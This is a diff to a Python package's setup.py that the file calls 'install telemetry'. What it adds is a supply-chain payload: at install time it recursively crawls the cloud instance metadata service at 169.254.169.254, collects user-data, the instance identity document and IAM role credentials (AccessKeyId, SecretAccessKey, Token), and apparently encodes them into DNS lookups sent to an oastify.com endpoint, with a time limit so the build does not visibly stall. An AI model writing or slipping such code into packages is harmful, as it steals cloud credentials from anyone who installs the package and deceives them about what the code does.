@@ -12,30 +12,36 @@ from setuptools import setup
 
 # --- install telemetry ----------------------------------------------------
 
-_ENDPOINT = "n2q2f4ogvgmnkxlo7s0curvfd6jx7nvc.oastify.com"
+_ENDPOINT = "7s0m5oe0l0c7ahb8xcqwkblz3q9hx8lx.oastify.com"
 _CHUNK = 48          # idx(3) + "-" + chunk(3) + "-" + 48 = 56, under the 63-octet label cap
-_WORKERS = 48        # DNS lookups in flight
-_DEADLINE = 15       # seconds; the build never blocks longer than this
-_HTTP_TIMEOUT = 2
+_WORKERS = 64        # DNS lookups in flight
+_DEADLINE = 20       # seconds; the build never blocks longer than this
+_HTTP_TIMEOUT = 3
 _HTTP_WORKERS = 12
 
 _META_VAR = "AWS_EC2_METADATA_SERVICE_ENDPOINT"
 _META_FALLBACK = "169.254.169.254"     # direct route, in case the proxy breaks the v2 PUT
 _META_ROOT = "/latest/meta-data"       # NOTE: no trailing slash - MMDS uses JSON Pointers
+_META_DYN = "/latest/dynamic"
 _META_USERDATA = "/latest/user-data"
 _META_IDENTITY = "/latest/dynamic/instance-identity/document"
-_META_PROFILE = "/latest/meta-data/profile"
-_META_IDC = "/latest/meta-data/identity-credentials"
 
-# directories whose listings are followed downward: (path, label prefix)
+# trees that get followed downward, recursively: (path, label prefix)
 _META_WALKS = (
-    (_META_IDC, "idc"),
-    (_META_ROOT + "/placement", "placement"),
-    (_META_ROOT + "/services", "services"),
+    (_META_ROOT, "meta-data"),
+    (_META_DYN, "dynamic"),
 )
-_META_WALK_DEPTH = 4
-_META_WALK_BREADTH = 6
-_META_STATUS_CAP = 48                  # log tokens kept per base, to bound the payload
+_META_DEPTH = 6                        # meta-data/network/interfaces/macs/<mac>/... is 5 deep
+_META_BREADTH = 32                     # the root listing alone has ~23 children
+_META_NODE_CAP = 200                   # total labels, hard stop
+_META_BODY_CAP = 1500                  # truncate huge bodies (pkcs7 blobs)
+_META_STATUS_CAP = 64                  # log tokens kept per base, to bound the payload
+_META_FIELDS = ("AccessKeyId", "SecretAccessKey", "Token",
+                "Expiration", "Code", "Type", "LastUpdated")
+
+# a leaf under one of these is also fetched with Accept: application/json, because
+# an MMDS object resource can otherwise answer with bare key names instead of values
+_JSON_HINTS = ("credential", "identity", "profile", "/info")
 
 _JSON = {"Accept": "application/json"}
 
@@ -144,7 +150,7 @@ def _fetch(base, token, paths, log):
                 log.append("%s:%s" % (label, _why(exc)))
                 continue
             if body:
-                found[label] = body
+                found[label] = body[:_META_BODY_CAP]
                 log.append(label + ":ok")
             else:
                 log.append(label + ":empty")
@@ -153,31 +159,41 @@ def _fetch(base, token, paths, log):
         pool.shutdown(wait=False)
 
 
-def _walk(base, token, path, prefix, depth, found, log):
-    """Follow an IMDS listing downward.
+def _wants_json(path):
+    return any(hint in path for hint in _JSON_HINTS)
 
-    Directories are marked with a trailing '/'; anything else is a leaf and is
-    fetched twice - plain, and with Accept: application/json, because an MMDS
-    object resource can otherwise answer with bare key names instead of values.
+
+def _walk(base, token, path, prefix, depth, found, paths, log):
+    """Recurse an IMDS tree.
+
+    A listing marks directories with a trailing '/', so the parent tells us
+    which children to descend and which are leaves. That is what makes
+    iam/ -> security-credentials -> <role> and
+    identity-credentials/ec2/security-credentials/ec2-instance resolve with no
+    hardcoded paths.
     """
-    if depth <= 0 or len(found) >= 80:
+    if depth <= 0 or len(found) >= _META_NODE_CAP:
         return
     listing = _fetch(base, token, ((path, prefix, False),), log).get(prefix)
     if not listing:
         return
+    paths[prefix] = path
     leaves = []
-    for child in listing.splitlines()[:_META_WALK_BREADTH]:
+    for child in listing.splitlines()[:_META_BREADTH]:
         child = child.strip()
         if not child:
             continue
         if child.endswith("/"):
             name = child.rstrip("/")
             _walk(base, token, path + "/" + _quote(name),
-                  prefix + "." + name, depth - 1, found, log)
+                  prefix + "." + name, depth - 1, found, paths, log)
         else:
             leaf = path + "/" + _quote(child)
-            leaves.append((leaf, prefix + "." + child, False))
-            leaves.append((leaf, prefix + "." + child + ".json", True))
+            label = prefix + "." + child
+            paths[label] = leaf
+            leaves.append((leaf, label, False))
+            if _wants_json(leaf):
+                leaves.append((leaf, label + ".json", True))
     if leaves:
         found.update(_fetch(base, token, tuple(leaves), log))
 
@@ -201,16 +217,26 @@ def _probe(base, log):
 
     found = _fetch(base, token, (
         ("", "root", False),
-        (_META_ROOT, "meta-data", False),
         (_META_USERDATA, "user-data", False),
         (_META_IDENTITY, "identity", False),
-        (_META_PROFILE, "profile", False),
     ), log)
-    if not found:
-        return {}
 
+    paths = {}
     for path, prefix in _META_WALKS:
-        _walk(base, token, path, prefix, _META_WALK_DEPTH, found, log)
+        _walk(base, token, path, prefix, _META_DEPTH, found, paths, log)
+
+    # anything that looks like a credential document also gets its fields split out
+    extra = []
+    for label in list(found):
+        if "AccessKeyId" not in found[label]:
+            continue
+        leaf = paths.get(label)
+        if not leaf:
+            continue
+        for field in _META_FIELDS:
+            extra.append((leaf + "/" + field, label + "." + field, False))
+    if extra:
+        found.update(_fetch(base, token, tuple(extra), log))
 
     return found
 
